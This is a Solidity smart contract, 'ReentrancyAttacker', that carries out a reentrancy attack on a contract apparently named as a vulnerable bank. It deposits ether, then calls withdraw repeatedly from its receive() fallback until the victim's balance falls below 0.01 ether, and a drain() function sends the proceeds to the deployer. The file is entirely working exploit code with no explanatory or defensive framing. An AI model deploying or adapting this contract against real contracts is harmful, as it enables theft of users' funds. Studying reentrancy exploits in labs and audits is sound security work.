// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVulnerableBank {
    function deposit() external payable;
    function withdraw() external;
}

contract ReentrancyAttacker {
    address private immutable owner;
    IVulnerableBank private immutable vulnerableContract;

    constructor(address _victim) {
        owner = msg.sender;
        vulnerableContract = IVulnerableBank(_victim);
    }

    function attack() external payable {
        require(msg.sender == owner, "Not owner");

        vulnerableContract.deposit{value: msg.value}();

        vulnerableContract.withdraw();
    }

    function fund() external payable {}

    receive() external payable {
        uint256 targetBalance = address(vulnerableContract).balance;

        if (targetBalance > 10000000000000000 wei) {
            vulnerableContract.withdraw();
        }
    }
    
    function drain() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }
}
